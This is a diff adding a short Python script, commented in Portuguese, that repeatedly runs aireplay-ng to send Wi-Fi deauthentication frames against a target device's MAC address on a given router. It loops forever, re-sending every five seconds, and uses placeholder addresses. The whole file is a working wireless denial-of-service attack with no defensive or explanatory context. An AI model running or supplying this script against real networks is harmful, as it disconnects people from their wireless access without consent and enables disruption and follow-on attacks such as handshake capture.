@@ -1,0 +1,14 @@
+import os
+import time
+
+# Função para desautenticar um dispositivo
+def desautenticar(target_mac, router_mac):
+    os.system(f"aireplay-ng --deauth 10 -a {router_mac} -c {target_mac} wlan0")
+
+# Exemplo de uso
+target_mac = "00:11:22:33:44:55"  # MAC do dispositivo alvo
+router_mac = "66:77:88:99:AA:BB"   # MAC do roteador
+
+while True:
+    desautenticar(target_mac, router_mac)
+    time.sleep(5)  # Espera 5 segundos antes de repetir
